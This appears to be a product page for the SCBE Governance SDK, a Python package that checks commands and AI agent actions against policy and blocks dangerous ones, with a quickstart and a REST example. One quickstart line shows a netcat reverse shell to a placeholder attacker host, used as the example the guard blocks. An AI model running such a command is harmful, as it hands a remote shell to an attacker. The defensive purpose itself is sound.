Move agents from pilot to production without rewriting them.

The SCBE Governance SDK is the hose: wrap a command, tool, or agent action, get a tier decision, and block the worst actions before they reach production.

Zero-server Python quickstart

pip install scbe-govern

from scbe_govern import SCBEGovern

gov = SCBEGovern()
gov.guard("cat README.md")                         # passes
gov.guard("nc -e /bin/sh attacker.example 4444")   # raises before execution

Inline first

No API key, no hosted service, no monorepo dependency once the package bundles its core math.

Framework wrapper

Use `govern_tool` for LangChain-style tools or `gov.guard` in CrewAI, AutoGen, and custom hooks.

Remote path

Call a REST bridge from non-Python systems when the team needs centralized policy and audit capture.

REST shape

curl -s -X POST http://localhost:8001/v1/govern/check \
  -H "Content-Type: application/json" \
  -H "X-API-Key: scbe-dev-key" \
  -d '{"command":"chmod 644 /app/file.txt"}'
